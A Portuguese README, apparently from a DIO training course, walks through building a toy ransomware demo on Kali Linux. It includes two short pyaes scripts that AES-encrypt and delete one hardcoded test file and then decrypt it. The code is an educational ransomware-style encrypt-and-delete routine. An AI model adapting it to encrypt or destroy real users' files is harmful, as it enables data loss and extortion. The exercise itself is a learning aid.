# Projeto desafio ransomwre

Projeto criado para curso da DIO utilizando o a distribuição Kali linux. 
## Passo a passo

1. Abrir o PROTON VPN (ou outro VPN, no caso esse eu já conhecia)
2. Abrir o Kali Linux
3. Abrir o prompt
4. Logar como root: digitar "sudo su" e, quando solicitado digitar a senha do sistema
5. Criar um diretorio: "mkdir projeto_ransowre"
6. Criar o arquivo descripto.py com o comando:"nano descripto.py"
7. digitar o codigo em python:

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

![capturadetela](/ProjetoDois/decripto.png)
 
8. Criar o arquivo encripta. py com o seghunte código:

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
9.  Salvar o arquivo com o ctrl + O e encerrar o arquivo com o comando ctrl + x

![capturadetela](/ProjetoDois/encripto.png))
10. Testar

